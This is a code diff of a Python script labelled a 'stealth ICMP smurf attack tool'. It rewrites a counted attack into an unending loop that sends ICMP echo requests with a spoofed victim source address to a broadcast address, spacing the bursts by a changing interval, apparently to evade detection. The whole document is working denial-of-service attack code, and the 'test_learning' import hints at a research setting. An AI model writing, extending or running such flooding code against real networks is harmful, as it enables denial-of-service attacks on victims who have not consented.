@@ -1,10 +1,20 @@
 """
-ICMP smurf attack tool
+Stealth ICMP smurf attack tool
 """
-import sys
-import socket
 
-from test_learning import configs
+import random
+import socket
+import sys
+import time
+
+from .. import configs
+
+# GLOBALS
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+bytes = random._urandom(1024)  # 1024 represents one byte to the server
+
+sent = 0
 
 
 def IPHeader(source, destination, proto):
@@ -34,7 +44,9 @@ def CreateICMPRequest():
     return packet
 
 
-def smurfattack(values):
+def stealth_smurf():
+    global sent
+    duration = 0
     try:
         icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         icmpsocket.bind(('', 1))
@@ -43,25 +55,33 @@ def smurfattack(values):
         icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     except socket.error:
         print "You need to be root!"
-        sys.exit(0)
+        sys.exit(1)
 
-    # send icmp echo request to supplied destination address with spoofed source address
-    try:
-        icmpsocket.connect((values[2], 1))
-        counter = 1
-        while (counter <= int(values[3])):
-            icmpsocket.send(str(IPHeader(values[1], values[2], proto=b'\x01')) + str(CreateICMPRequest()))
-            counter = int(counter) + 1
-    except KeyboardInterrupt:
-        icmpsocket.close()
+    icmpsocket.connect((configs.broadcast_address, 1))
 
-    print "sent %d icmp echo requests to %s with %s as source" % (int(values[3]), values[2], values[1])
+    while True:
+        # send packet
+        icmpsocket.send(str(IPHeader(configs.victim, configs.broadcast_address, proto=b'\x01')) + str(CreateICMPRequest()))
 
+        # increment counter
+        sent += 1
 
-def help_smurfattack():
-    print "Usage: smurfattack <source IP> <broadcast address> <number of requests> "
+        # print log
+        print "%s packets were sent to %s. interval time: %s, send interval: %s" % (sent, configs.victim, duration, configs.send_interval)
 
+        # sleep for send_interval secs
+        time.sleep(configs.send_interval)
 
-def smurf_attack():
-    values = ('mock', configs.victim, configs.broadcast_address, '1000')
-    smurfattack(values)
+        # increment duration
+        duration += configs.send_interval
+
+        # if window len wasn't over continue
+        if duration < configs.window_length:
+            continue
+
+        # start new window and initial duration and send interval
+        duration = 0
+
+        configs.send_interval *= configs.interval_factor
+
+    icmpsocket.close
